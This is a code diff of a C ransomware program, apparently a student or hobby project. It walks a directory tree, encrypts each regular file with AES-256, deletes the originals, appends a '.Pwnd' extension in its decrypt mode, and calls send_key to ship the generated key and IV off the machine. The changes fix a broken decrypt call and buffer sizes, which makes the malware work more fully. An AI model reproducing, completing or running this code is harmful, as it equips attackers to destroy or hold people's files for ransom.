@@ -1,6 +1,6 @@
 #include "ransomlib.h"
-#include <dirent.h> // for socket
-#include <sys/socket.h>
+#include <dirent.h> 
+#include <sys/socket.h> // for socket
 #include <unistd.h> 
 #include <arpa/inet.h>
 
@@ -53,19 +53,14 @@ void listdir(const char *name, unsigned char *iv, unsigned char *key, char de_fl
 	
 	struct dirent* entity;
 	entity = readdir(dir);
-	//char *str_name = (char *)malloc(sizeof(char)*strlen(entity->d_name));
-	//strcpy(str_name,entity->d_name);
-	//char pa[200] = "/home/kali/Ransomware/Ransomware-main/important/0003.JPG";
 	
 	while (entity != NULL)
 	{
 		
 		 if (entity->d_name[0] != '.')
-
 		{
 			//printf("[type of folder : %d]  %s/%s\n",entity->d_type,name,entity->d_name);			
 			if(entity->d_type == DT_DIR && strcmp(entity->d_name,".")!=0 && strcmp(entity->d_name,"..")!=0)
-
 			{
 				char path[BUFSIZE] = {0};
 				strcat(path,name);
@@ -75,39 +70,40 @@ void listdir(const char *name, unsigned char *iv, unsigned char *key, char de_fl
 				{
 					listdir(path, iv, key, 'e');
 				}
+				
 				if(de_flag=='d')
 				{
 					listdir(path, iv, key, 'd');
 				}
-
-
 			}
+			
 			if(de_flag=='e' && entity->d_type == DT_REG)
 			{
-				//printf("<<<<<%s>>>>\n",name);
-				 
-				//printf("%s\n",str_name);
-				// printf("%x\n",key);
-				char twooo[300] = "";
+				char twooo[BUFSIZE] = "";
 				strcat(twooo,name);
 				strcat(twooo,"/");
 				strcat(twooo,entity->d_name);
-				printf("%s \n",twooo);
 				encrypt(key, iv,twooo);
-				printf("REPASSE ICI");
-				remove(twooo);
 				
+				// char quatre[BUFSIZE] = "";
+				// strcat(quatre, twooo);
+				// strcat(quatre, ".Pwnd");
+				
+				remove(twooo);
+				// decrypt(key, iv, quatre);
+				// remove(quatre);
 			}
+			
 			else if(de_flag=='d' && entity->d_type == DT_REG)
 			{
-				char troiii[300] = "";
+				char troiii[BUFSIZE] = "";
 				strcat(troiii,name);
 				strcat(troiii,"/");
 				strcat(troiii,entity->d_name);
-				decrypt(,,troiii);
+				strcat(troiii, ".Pwnd");
+				
+				decrypt(key, iv, troiii);
 				remove(troiii);
-				
-				
 			}
 		}
 		
@@ -115,7 +111,6 @@ void listdir(const char *name, unsigned char *iv, unsigned char *key, char de_fl
 	}
 	closedir(dir);
 }
-
 
 int generate_key(unsigned char *key, int sizeKey, unsigned char *iv, int sizeIv,char *pKey, char *pIv)
 {
@@ -174,7 +169,7 @@ int main (int argc, char * argv[])
 		printf("./ransom PATH \n");
 	}
 	
-	else if(argc==3)
+	else if(argc==5 || argc==3)
 	{
 		unsigned char key[AES_256_KEY_SIZE];
 		unsigned char iv[AES_BLOCK_SIZE];
@@ -192,14 +187,19 @@ int main (int argc, char * argv[])
 			generate_key(key, sizeKey, iv, sizeIv, pKey, pIv);
 			send_key(pKey, pIv);
 			listdir(argv[1], iv, key, 'e');
+			
 		}
 		
 		if (strcmp(argv[2], "-dec")==0)
 		{
+			// hexa_to_bytes(argv[3] , key, sizeKey);
+			// hexa_to_bytes(argv[4] , iv, sizeIv);
 			listdir(argv[1], iv, key, 'd');
-			printf("test");
+			
+			// printf("test");
 		}
+		
+		free((char *)pKey);
+		free((char *)pIv);
 	}
 }
-
-
